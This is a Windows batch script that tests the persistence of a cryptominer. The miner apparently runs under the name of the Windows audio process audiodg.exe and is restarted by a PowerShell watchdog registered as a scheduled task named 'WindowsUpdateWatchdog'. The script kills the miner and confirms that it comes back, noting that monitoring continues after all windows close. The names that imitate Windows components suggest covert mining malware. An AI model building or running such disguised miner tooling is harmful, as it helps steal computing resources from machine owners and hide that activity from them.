@echo off
title TEST WATCHDOG
color 0E

echo ================================================================
echo  TEST WATCHDOG FUNCTIONALITY
echo ================================================================
echo.

echo Step 1: Check if watchdog scheduled task exists...
schtasks /query /tn "WindowsUpdateWatchdog" >nul 2>&1
if %ERRORLEVEL%==0 (
    echo [OK] Watchdog task exists
) else (
    echo [FAIL] Watchdog task not found
    echo Run START_ULTIMATE_FIXED.bat first!
    pause
    exit
)

echo.
echo Step 2: Check if watchdog is running...
tasklist /FI "IMAGENAME eq powershell.exe" | find /I "powershell.exe" >nul
if %ERRORLEVEL%==0 (
    echo [OK] PowerShell watchdog process found
) else (
    echo [WARN] Watchdog may not be running
)

echo.
echo Step 3: Check if miner is running...
tasklist /FI "IMAGENAME eq audiodg.exe" | find /I "audiodg.exe" >nul
if %ERRORLEVEL%==0 (
    echo [OK] Miner is running (audiodg.exe)
    set MINER_RUNNING=1
) else (
    echo [INFO] Miner not running currently
)

echo.
echo ================================================================
echo  TEST: Kill miner and wait for watchdog to restart it
echo ================================================================
echo.

if defined MINER_RUNNING (
    echo Killing miner process...
    taskkill /F /IM audiodg.exe 2>nul
    echo [OK] Miner killed
    
    echo.
    echo Waiting 20 seconds for watchdog to detect and restart...
    timeout /t 20
    
    echo.
    echo Checking if miner restarted...
    tasklist /FI "IMAGENAME eq audiodg.exe" | find /I "audiodg.exe" >nul
    if %ERRORLEVEL%==0 (
        echo.
        echo ================================================================
        echo  SUCCESS! Watchdog auto-restarted the miner!
        echo ================================================================
        echo.
        echo The watchdog is working correctly.
        echo It will keep monitoring even after you close all windows.
    ) else (
        echo.
        echo ================================================================
        echo  FAIL: Watchdog did not restart miner
        echo ================================================================
        echo.
        echo Check watchdog log at: %TEMP%\watchdog.log
        echo.
        type "%TEMP%\watchdog.log" 2>nul
    )
) else (
    echo.
    echo Miner was not running, cannot test restart functionality.
    echo Run START_ULTIMATE_FIXED.bat first!
)

echo.
pause
